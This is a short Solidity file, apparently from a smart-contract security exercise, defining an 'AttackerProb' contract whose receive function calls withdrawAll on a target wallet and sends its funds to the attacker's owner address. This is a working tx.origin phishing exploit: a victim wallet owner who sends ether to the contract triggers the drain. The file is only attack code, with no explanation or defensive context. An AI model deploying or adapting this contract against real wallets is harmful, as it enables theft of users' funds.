//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISmallWalletProb {
    function withdrawAll(address _recipient) external;
}

contract AttackerProb is Ownable {
    ISmallWalletProb private immutable smallWallet;

    constructor(ISmallWalletProb _smallwallet) {
        smallWallet = _smallwallet;
    }

    receive() external payable {
        smallWallet.withdrawAll(owner());
    }
}
